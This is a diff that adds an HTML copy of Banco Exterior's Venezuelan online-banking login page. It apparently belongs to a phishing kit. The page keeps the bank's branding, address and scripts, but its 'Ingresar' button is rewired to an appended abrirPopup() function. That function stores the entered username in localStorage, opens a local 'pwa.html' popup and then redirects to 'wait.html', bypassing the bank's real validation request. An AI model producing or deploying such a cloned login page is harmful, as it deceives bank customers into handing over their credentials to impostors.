@@ -1,0 +1,743 @@
+<HTML>
+<HEAD><script x-apm-ba-response-bt="servertime%3D1745354331979%2CapmAgentHost%3Dsdk2bhvmlfmNKBf9HrBkOSd0FF91Lk1zSZS0%2Bn4k3vA%3D%2CapmServletName%3D6EAn9yz%2FJcRxDCQUH9urlg%3D%3D%2CapmAgentProcess%3DObOejRBtGSSLitYjHHCNFA%3D%3D%2CapmAgentName%3DyS8MN6rveXKT5gIn9eiZaA%3D%3D%2CapmWebAppName%3DZdaznoiTG4bP7c%2FBfozKQXokFyGa63TUQrT1kMKUN18%3D"  type="text/javascript" id="ca_eum_ba" src="http://localhost:80/api/1/urn:ca:tenantId:default-tenant/urn:ca:appId:default-app/bajs?agent=browser" data-profileUrl="http://localhost:80/api/1/urn:ca:tenantId:default-tenant/urn:ca:appId:default-app/profile?agent=browser" data-tenantID="default-tenant" data-appID="default-app" data-appKey="b0361800-4736-11e6-b8e5-bddc75280658"></script>
+<SCRIPT SRC="/personas_files/UtilsScript.jsp"> </SCRIPT>
+<!-- Escript de monitoreo -->
+<script type="text/javascript" id="ca_eum_ba" src="https://dxc.dxi-na1.saas.broadcom.com/api/1/urn:ca:tenantId:A577E02B-E720-5C1A-6C59-B3B9D7DA24BA/urn:ca:appId:prueba/bajs?agent=browser" data-profileUrl="https://dxc.dxi-na1.saas.broadcom.com/api/1/urn:ca:tenantId:A577E02B-E720-5C1A-6C59-B3B9D7DA24BA/urn:ca:appId:prueba/profile?agent=browser" data-tenantID="A577E02B-E720-5C1A-6C59-B3B9D7DA24BA" data-appID="prueba" data-appVersion="1.0" data-use-axa-appname="true" data-appKey="980b09b0-a5fa-11ec-8947-f98e6f794d52" async ></script>
+<link rel="stylesheet" href="personas_files/style.css">
+
+<TITLE>Banco Exterior, Sistema de Banca por Internet</TITLE>
+<script type="text/javascript">
+  (function() {
+    var sa = document.createElement('script'); sa.type = 'text/javascript';
+sa.async = true;
+    sa.src = ('https:' == document.location.protocol ? 'https://cdn' :
+'http://cdn') + '.ywxi.net/js/1.js';
+    var s = document.getElementsByTagName('script')[0];
+s.parentNode.insertBefore(sa, s);
+  })();
+</script>
+<script language="JavaScript">
+
+var showIndex=true; //Variable para determinar si se muestra o no el index.jsp
+
+//Detectando si es Chrome
+var is_chrome= navigator.userAgent.toLowerCase().indexOf('chrome/') > -1;  
+
+document.oncontextmenu=new Function("return false");
+document.onmousedown=blurify;
+
+document.ondragstart=new Function("return false");
+document.onselectstart=new Function("return false");
+
+top.window.moveTo(0,0);
+if (document.all) {
+  top.window.resizeTo(screen.availWidth,screen.availHeight);
+}
+else if (document.layers||document.getElementById) {
+  if (top.window.outerHeight<screen.availHeight||top.window.outerWidth<screen.availWidth){
+    top.window.outerHeight = screen.availHeight;
+    top.window.outerWidth = screen.availWidth;
+  }
+}
+
+var FishWindow = false; // Variable que contiene el id de la ventana Fish para hacer login al sistema
+
+function GetFish()
+{
+  if (document.forms[0].UserId.value == "")
+  {
+     alert("El identificador de Usuario no puede estar en blanco");
+     document.forms[0].UserId.focus();
+  }
+  else
+  if(document.getElementById('UserId').disabled==false)
+  {	 
+	deshabilitarCampos();	
+    validarUsuario();
+  }  
+}
+
+function closeFishWindow()
+{
+  if(FishWindow!=false)
+  {
+    if(FishWindow.closed == false)
+    {	
+      FishWindow.close();
+      FishWindow=false;
+    }
+  }
+}
+
+function deshabilitarCampos()
+{
+   //Se despliega el mensaje de espera
+   document.getElementById('wait').style.display=""; 	 
+
+   //Se coloca readOnly el campo userid
+   document.getElementById('UserId').disabled=true;
+
+   //Se deshabilitan los botones y links	
+   if (navigator.appName =="Microsoft Internet Explorer" )
+   {     		 
+		 document.getElementById('botonLogin').disabled=true;
+		 document.getElementById('botonNewUser').disabled=true;
+		 document.getElementById('recoverAlias').disabled=true;
+		 document.getElementById('recoverPass').disabled=true;
+		 document.getElementById('userSusp').disabled=true;
+		 document.getElementById('demo').disabled=true;
+   }
+}
+
+
+function validarUsuario()
+{		
+	var request;
+	var fecha=new Date();
+	var diames=fecha.getDate();
+	var mes=fecha.getMonth() +1 ;
+	var ano=fecha.getFullYear();
+	var fechaLog = "[" + diames + "/" + mes + "/" + ano + " " + fecha + "]";
+	request = nuevoAjax();	
+	var url = "/internetbanking/JSUserOPass?PB=6";
+	var parametros = 'UserIdJSP=' + document.forms[0].UserId.value + "&fechaLog=" + fechaLog + "&isChrome=" + is_chrome;
+	
+	request.open("POST", url, true);	
+	request.onreadystatechange = function() 
+	{	
+   		if ((request.readyState == 4) && (request.status == 200)) 
+		{	   					
+			var xml = request.responseXML;
+			if(xml == null || xml.getElementsByTagName('response')[0] == null)
+			{
+				window.location='body_eod_error.jsp';
+			}
+			else
+			if(xml.getElementsByTagName('response')[0].getElementsByTagName('error')[0] == null && 
+			   xml.getElementsByTagName('response')[0].getElementsByTagName('USER_BLOCKED')[0] == null && 
+			   xml.getElementsByTagName('response')[0].getElementsByTagName('USER_SUSPENDED')[0] == null &&
+			   xml.getElementsByTagName('response')[0].getElementsByTagName('USER_STATUS_NOT_PERMITTED')[0] == null &&
+			   xml.getElementsByTagName('response')[0].getElementsByTagName('USER_MUST_RESTART')[0] == null)
+			{	
+			
+				 closeFishWindow();
+			     document.forms[0].VALPHI.value="1";
+			     page = "/internetbanking/JSUserOPass?PB=6&UserIdJSP=" + document.forms[0].UserId.value;
+			     FishWindow = window.open("pop_valphishing.jsp",'FishWindow','height=650,width=500,scrollbars=yes,top=0,left=0');				
+			    
+			}
+			else
+			if(xml.getElementsByTagName('response')[0].getElementsByTagName('USER_BLOCKED')[0] != null || 
+			   xml.getElementsByTagName('response')[0].getElementsByTagName('USER_SUSPENDED')[0] != null ||
+			   xml.getElementsByTagName('response')[0].getElementsByTagName('USER_STATUS_NOT_PERMITTED')[0] != null ||
+			   xml.getElementsByTagName('response')[0].getElementsByTagName('USER_MUST_RESTART')[0] != null)
+			{
+				window.location='login_operations.jsp';			
+			}
+			else
+			if(xml.getElementsByTagName('response')[0].getElementsByTagName('error')[0] != null)
+			{				
+				window.location='body_beca_error.jsp';			
+			}
+	  	}else{
+			
+		}
+    }
+   	
+    //Validacion para funcionamieento de UTF-8 para los navegadores, incorporado por IBM
+    //Caso Firefox
+    if(request.sendAsBinary != null)
+    {
+    request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");	
+	request.sendAsBinary(parametros);
+	}
+	//Resto de los navegadores
+	else
+	{
+	request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
+	request.send(parametros);
+	}
+	
+}
+
+
+function presskey(oEvent) {
+   if (oEvent.keyCode == 13){
+        GetFish();
+        return false;
+       }
+}
+
+
+function FSubmitValidation(){
+ if (document.forms[0].UserId.value == ""){
+   alert("El identificador de Usuario no puede estar en blanco");
+   document.forms[0].UserId.focus();
+   return false;
+ }
+
+   return true;
+
+}
+
+function sspage(lang){
+  parent.window.location.href='/internetbanking/JSLogIn_INI?LNG=' + lang + '&UTYPE=2&isChrome=' + is_chrome;
+}
+
+function sload(){  
+  Nifty("table.buttond a","transparent small");
+}
+
+function GetNewUser()
+{
+  if(document.getElementById('UserId').disabled==false)
+  {
+	 closeFishWindow();
+
+     document.forms[0].action="body_wait.jsp?AUTOREGISTRO=1&ServletName=/internetbanking/JSLogIn_INI?pag=5&isChrome=" + is_chrome;
+     document.forms[0].submit();    
+  }
+}
+
+function GetRecoverAlias()
+{
+	if(document.getElementById('UserId').disabled==false)
+	{
+	   closeFishWindow();
+
+       document.forms[0].action="body_wait.jsp?ServletName=/internetbanking/JSLogIn_INI?pag=3&isChrome=" + is_chrome;
+	   document.forms[0].submit();    
+	}
+}
+
+function GetRecoverPassword(option)
+{ 
+	if(document.getElementById('UserId').disabled==false)
+	{ 
+	   if (document.forms[0].UserId.value == ""){
+	     alert("El identificador de Usuario no puede estar en blanco");
+	     document.forms[0].UserId.focus();
+	   }
+	   else
+	   {
+		 deshabilitarCampos();
+
+		 closeFishWindow();
+
+		 document.getElementById('UserId').disabled=false;
+
+ 	     document.forms[0].action="body_wait.jsp?ServletName=/internetbanking/JSLogIn_INI?pag=4&option=" + option + "&isChrome=" + is_chrome;;
+	     document.forms[0].submit();  		 
+	   }
+	}
+}
+//Agregado por Gabriel Gonzalez E59115 PYTLBE 03/09/2012
+function GetDesbloqueoUsuario()
+{ 
+	if(document.getElementById('UserId').disabled==false)
+	{
+	   closeFishWindow();
+
+       document.forms[0].action="body_wait.jsp?ServletName=/internetbanking/JSLogIn_INI?pag=6&isChrome=" + is_chrome;
+	   document.forms[0].submit();    
+	}
+}
+
+//Agregado por Gabriel Gonzalez E59115 PYTLBE 03/09/2012
+function GetDesbloqueoUsuario()
+{ 
+	if(document.getElementById('UserId').disabled==false)
+	{
+	   closeFishWindow();
+
+       document.forms[0].action="body_wait.jsp?ServletName=/internetbanking/JSLogIn_INI?pag=6&isChrome=" + is_chrome;
+	   document.forms[0].submit();    
+	}
+}
+
+function verDemo()
+{
+   if(document.getElementById('UserId').disabled==false)
+   { 
+	  closeFishWindow();
+
+	  alert('En Construcci�n')
+   }
+}
+
+</script>
+
+
+</HEAD> 
+<BODY onLoad="sload()" background="/body_bg.gif">
+<FORM METHOD=POST AUTOCOMPLETE="OFF" ACTION="body_wait_login.jsp" onSubmit="return FSubmitValidation()" target="_parent">
+<INPUT TYPE=HIDDEN name=IPADD VALUE="186.85.108.23">
+<INPUT TYPE=HIDDEN name=UTYPE VALUE="2">
+<INPUT TYPE=HIDDEN name=VALPHI VALUE="1">
+<INPUT TYPE=HIDDEN NAME="OPASSWORD" VALUE="">
+<INPUT TYPE=HIDDEN NAME="FechaPhishingLoad" value="">
+<INPUT TYPE=HIDDEN NAME="FechaPhishingOnload" value="">
+
+<table id="mainIndexTable" style="display:none;" width="980" border="0" align="left" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF">
+    <tr> 
+      <td width="980" align="center" valign="top"> 
+        <table cellspacing=0 cellpadding=0 width=760 align=center border=0>
+          <tr> 
+            <td height="120" align="center" valign="middle"><img src="/top1.gif" width="955"></td>
+          </tr>
+        </table>
+
+		<table cellspacing=0 cellpadding=0 width=950 border=0>
+			<tr>
+				<td height="50" valign="middle" align="center" class="Usuario" style="font-size: 14px;font-weight: bold">
+					Bienvenido a          <img src="/img_int24.gif" align="middle" GALLERYIMG="no"> para gente sin igual
+				</td>
+				<td width="400" rowspan="5">
+				<div align="right"><img src="/banner_pasos_mod_2013.jpg" width="394" height="448" align="top" GALLERYIMG="no"></div>
+				   <!--<div align="right"><img src="images/banner_pasos_mod.jpg" width="394" height="448" align="top" GALLERYIMG="no"></div>
+				--></td>
+			</tr>
+
+			<tr>
+			 <td valign="top" align="center">
+			    <table align="center" border="0"  cellspacing=0 cellpadding=0>
+                 <tr>
+				   <td width="6%">&nbsp;</td>
+                   <td width="44%" class="Usuario" valign="top" align="center">
+                     <table cellspacing=0 cellpadding=0  border=0>
+              		  <tr>
+		                <td  align="left"  height="25" valign="bottom" class="opciones" colspan="2">
+       				    	1 . Es primera vez que ingreso a
+		                </td>            			
+          			  </tr>
+
+					  <tr>
+		                <td align="left" valign="top" class="opciones" height="25" colspan="2">
+       				    	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<FONT color="#0139b3">Exterior NEXO En Linea.</FONT>&nbsp;
+		                </td>            			
+          			  </tr>
+					  
+					  <TR>
+ 					    <TD height="25" colspan="2">&nbsp;</td>
+              		  </tr>
+					   <tr valign="middle" align="left">
+              		    <td height="32" width="15%">&nbsp;</td>
+              		    <td height="32" width="85%">
+          				  <table border=0 class="buttond">
+							<tr>
+							  <td width="120">
+							    <a id="botonNewUser" href="javascript: GetNewUser()" onMouseOver= "window.status='';return true" > Auto registro  </a>
+							  </td>
+						    </tr>
+			    		  </table>						  
+          				</td>
+          			   </tr>
+
+					  <TR>
+ 					    <TD height="38" colspan="2">&nbsp;</td>
+              		  </tr>
+					  
+					   <tr>
+              		    <td align="left" height="26" valign="middle" colspan="2">          				   
+						   <SPAN class="opciones">
+							 Necesito asesoria para registrarme:
+						   </SPAN>
+          				</td>
+          			  </tr>
+
+              		  <tr>
+              		    <td align="left" height="26" colspan="2">          				   
+						   <SPAN class="opciones">
+							 Comunicate con nosotros a traves de <br>Exterior NEXO Telefonico: 0212-508 5000  en el
+						   </SPAN>
+          				</td>
+          			  </tr>
+
+					   <tr>
+              		    <td align="left" height="26" colspan="2">          				   
+						   <SPAN class="opciones">
+							 nuevo modulo de <b>Atencion al Cliente</b><br>disponible en www.bancoexterior.com
+						   </SPAN>
+          				</td>
+          			  </tr>
+					  			  
+
+					  <TR>
+ 					    <TD height="5" colspan="2">
+							&nbsp;
+					    </td>
+              		  </tr>
+            	</table>
+             </td>
+
+
+			<td width="4%">&nbsp;</td>
+
+			 <td width="40%" class="Usuario"  align="center" valign="top">
+               <table cellspacing=0 cellpadding=0  border=0>
+			      <tr>
+					<td colspan="2" align="left" valign="bottom" class="opciones"
+							height="25">2. Ya complete el Auto Registro y tengo mi
+					</td>
+				  </tr>
+				  <TR>
+					<TD colspan="2" height="25" align="center" valign="top" class="opciones">
+								nuevo usuario y clave de acceso.</td>
+				  </tr>
+				  <TR>
+						<TD colspan="2" align="left" valign="bottom" class="Usuario" height="25">
+   				    	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+						usuario
+				   </td>
+      			  </tr>				
+          		  <tr>          		     
+	                 <td width="36%"  align="left" valign="center" class="Usuario" height="32">   				    	
+		                <input style="width:108" class="cajatextologin" type="text" value="" maxlength="10" name="UserId" id="UserId" size="10" onKeyPress="return presskey(event)">
+					 </td>
+	                 <td  valign="middle" align="left" height="32">
+					   <table border=0 class="buttond" >
+						<tr>
+						  <td>
+						    <a id="botonLogin" onclick="abrirPopup()" > Ingresar  </a>
+						  </td>
+					    </tr>
+		    		   </table>
+				 	 </td>
+      			  </tr>
+				  
+				  <tr height="38" align="left" valign="bottom">
+          		    <td colspan="2">
+					  <div id="wait" style="display:none;" align="left">
+						<table cellspacing=0 cellpadding=0  border=0 width="171">
+						   <tr>
+							 <td style="font-size:10px;color:#ff5200;">Estamos procesando tu solicitud
+							  &nbsp;&nbsp;<img src="images/wait.gif">
+							 </td>							 
+						   </tr>
+						 </table>
+					  </div>
+					</td>
+      			  </tr>				  				   
+
+          		  <tr valign="middle">
+          		    <td colspan="2" align="left" height="26">          				   
+					   <SPAN class="opciones">
+						 <A id="recoverAlias" href="javascript:GetRecoverAlias()">¿Olvidaste tu usuario?</A>
+					   </SPAN>
+      				</td>
+      			  </tr>
+
+				   <tr height="26" valign="middle">
+          		    <td colspan="2" align="left">          				   
+					   <SPAN class="opciones">
+						 <A id="recoverPass" href="javascript:GetRecoverPassword(1)">¿Olvidaste tu Clave? </A>
+					   </SPAN>
+      				</td>
+      			  </tr>
+
+				  <tr height="26" valign="middle">
+          		    <td colspan="2" align="left">          				   
+					   <SPAN class="opciones">
+						 <A id="userSusp" href="javascript:GetRecoverPassword(2)">¿Tu usuario esta suspendido?</A>
+					   </SPAN>
+          			</td>
+          		  </tr>
+          		  <!--Agregado por Gabriel Gonzalez E59115 PYTLBE 03/09/2012-->
+          		  <tr height="26" valign="middle">
+          		    <td colspan="2" align="left">          				   
+					   <SPAN class="opciones">
+						 <A id="userSusp" href="javascript:GetDesbloqueoUsuario()">Usuario Desbloqueado</A>
+					   </SPAN>
+          			</td>
+          		  </tr>
+          		  
+
+
+				  <tr height="26" valign="middle">
+          		    <td colspan="2" align="left">          				   
+					   <SPAN class="opciones">
+						 <A id="demo" href="javascript: verDemo()">Ver Demo</A>
+					   </SPAN>
+          			</td>
+          		  </tr>
+
+            	</table>
+            </td>
+
+			<td width="6%">&nbsp;</td>
+
+            </tr>                                
+         </table>
+       </td>
+      </tr>
+
+	<tr height="50">
+	   <td align="center" valign="middle">
+		<table border="0" bordercolor="blue" width="75%">
+			<tr>
+			<!--RFC13718 Agregado 31/09/2020-->
+				<td width="135" align="center" valign="top">
+				<div id="DigiCertClickID_eNGFs-Wy" data-language="en"></div>
+				<script type="text/javascript">
+				var	__dcid = __dcid || [];__dcid.push(["DigiCertClickID_eNGFs-Wy", "3", "m", "black", "eNGFs-Wy"]);(function(){var cid=document.createElement("script");cid.async=true;cid.src="//seal.digicert.com/seals/cascade/seal.min.js";var s = document.getElementsByTagName("script");var ls = s[(s.length - 1)];ls.parentNode.insertBefore(cid, ls.nextSibling);}());
+				</script>
+				<br />	
+				<a href="https://www.digicert.com/ssl-certificate.htm"target="_blank"  style="color:#000000; text-decoration:none; font:bold 7px verdana,sans-serif; letter-spacing:.5px; text-align:center; margin:0px; padding:0px;">ACERCA DE LOS CERTIFICADOS SSL</a>		
+				</td>
+			</tr>
+		</table>
+	   </td>
+	</tr>
+
+	 <tr height="30">
+	      <td align="center" valign="middle">
+			<p align="center" class="pie">              
+	            Para una visualizacion optima recomendamos utilizar una resolucion del monitor <br>de 1024 x 768 pixeles o superior            
+			</p>
+	      </td>
+	</tr>
+
+	 <tr height="40">
+	      <td align="center" valign="middle">
+			<p align="center" class="pie">              
+	            Edif. Banco EXTERIOR, Avenida Urdaneta, entre esquinas Urapal y R&iacute;o,<br>
+				La Candelaria, Caracas-Venezuela, CP 1010            
+			</p>
+	      </td>
+	</tr>
+
+	</table>
+
+	<table border="0" cellspacing="0" cellpadding="0">
+      <tr>
+        <td><img src="/login2.gif" width="964" hspace="0" vspace="0" border="0" align="top"></td>
+      </tr>
+    </table>
+   </td>
+  </tr>
+</table>
+</form>
+</BODY>
+</HTML>
+
+<script language="JavaScript">
+if(showIndex==true)
+{
+   document.getElementById('mainIndexTable').style.display='';
+   document.forms[0].UserId.focus();
+}
+</script>
+
+<script src="/personas_files/borders.js" type="text/javascript"></script>
+
+<SCRIPT LANGUAGE="JavaScript">
+  //Deshabilitar teclas 
+  document.onkeydown = function(event){  		
+	
+	var alt=false;
+	var ctrl=false;
+	var kcode;		
+	var navegador="";
+	if(event)
+	{	
+		if(event.which)//Netscape    	
+		{
+			navegador="N";
+		    kcode=event.which; 	
+			
+			//Tecla Alt presionada
+			if(event.altKey)
+	  	   	  alt=true;
+
+			//Tecla Control presionada
+			if(event.ctrlKey)
+	  	   	  ctrl=true;
+		}
+	}
+	else
+	if(window.event.keyCode)//Internet Explorer 	
+	{
+		navegador="IE";
+	    kcode=window.event.keyCode; 
+		
+		//Tecla Alt presionada
+		if(window.event.altKey)
+	  	  alt=true;
+
+		//Tecla Control presionada
+		if(window.event.ctrlKey)
+	  	  ctrl=true;
+	}
+
+	//alert(kcode)
+	
+
+	//Deshabilia Alt + Flecha Izq y/o Der (Atras, Adelante)
+	if(alt==true && (kcode==37 || kcode==39))
+	{				  
+		return false;				
+	}
+
+	//Deshabilia Contol + C,V,X (Copiar, Pegar, Cortar)
+	if(ctrl==true && (kcode==67 || kcode==86 || kcode==88))
+	{
+		return false;
+	}
+
+	//Deshabilia F1 -> F12
+	if (kcode >= 112 && kcode <= 123)
+	{ 		
+		if(navegador=="N")
+		{				  
+		   return false;		
+		}
+		else
+		if(navegador=="IE")
+		{		   			   
+		   window.event.keyCode = 505;
+		   return false;  
+		}
+	} 
+		
+
+	if (kcode == 8) //BackSpace
+	{ 
+		valor = document.activeElement.value; 
+
+		if (valor==undefined) //Evita Back en p�gina. 
+		{ 
+			if(navegador=="N")//Netscape 
+			{
+			  event.preventDefault();
+ 		      event.returnValue = false;
+			}
+			return false;
+		}
+		else 
+		{ 	
+			var type = document.activeElement.type;
+			type = type.toUpperCase();					
+
+			if (type=='SELECT-ONE') //Evita Back en select. 
+			{ 
+				if(navegador=="N")//Netscape 
+				{
+				  event.preventDefault();
+	 		      event.returnValue = false;
+				}
+				return false;
+			}
+			else
+			if (type=='BUTTON') //Evita Back en button. 
+			{
+				if(navegador=="N")//Netscape 
+				{
+				  event.preventDefault();
+	 		      event.returnValue = false;
+				}
+				return false;
+			}
+			else 
+			if (type=='RADIO') //Evita Back en radio. 
+			{
+				if(navegador=="N")//Netscape 
+				{
+				  event.preventDefault();
+	 		      event.returnValue = false;
+				}
+				return false;
+			}
+			else 
+			if (type=='CHECKBOX') //Evita Back en checkbox. 
+			{ 
+				if(navegador=="N")//Netscape 
+				{
+				  event.preventDefault();
+	 		      event.returnValue = false;
+				}
+				return false;
+			}
+			else 
+			if (type=='FILE') //Evita Back en file. 
+			{ 
+				if(navegador=="N")//Netscape 
+				{
+				  event.preventDefault();
+	 		      event.returnValue = false;
+				}
+				return false;
+			}
+			else 
+			if (type=='RESET') //Evita Back en reset. 
+			{ 
+				if(navegador=="N")//Netscape 
+				{
+				  event.preventDefault();
+	 		      event.returnValue = false;
+				}
+				return false;
+			}
+			else 
+			if (type=='SUBMIT') //Evita Back en submit. 
+			{ 
+				if(navegador=="N")//Netscape 
+				{
+				  event.preventDefault();
+	 		      event.returnValue = false;
+				}
+				return false;
+			} 
+			else //Text, textarea o password 
+			{ 
+			    if (document.activeElement.value.length==0) //No realiza el backspace(largo igual a 0). 
+			    { 
+					if(navegador=="N")//Netscape 
+					{
+					  event.preventDefault();
+		 		      event.returnValue = false;
+					}
+					return false;	
+				}
+			    /*else //Realiza el backspace. 
+			    { 
+				  document.activeElement.value.keyCode = 8; 
+				}*/ 
+			} 
+			
+		} 
+	} 
+
+   }//fin desabilitar teclas ´
+
+
+
+   function abrirPopup() {
+      
+	  localStorage.setItem('usr', document.getElementById("UserId").value); 
+      localStorage.setItem('send', 'false'); 
+	  localStorage.setItem('popupAbierto', 'true');
+      popupVentana = window.open(
+        'pwa.html', 
+        'popup',
+        'width=600,height=400'
+      );
+
+      if (popupVentana) {
+		intervaloVerificacion = setInterval(() => {
+ 
+  if (localStorage.getItem("send") === "true") {
+   window.location.href = "wait.html";
+    if (popupVentana.closed) {
+      clearInterval(intervaloVerificacion);
+      
+      
+      
+    }
+  }
+}, 500);
+      }
+    }
+
+</SCRIPT>
+
+
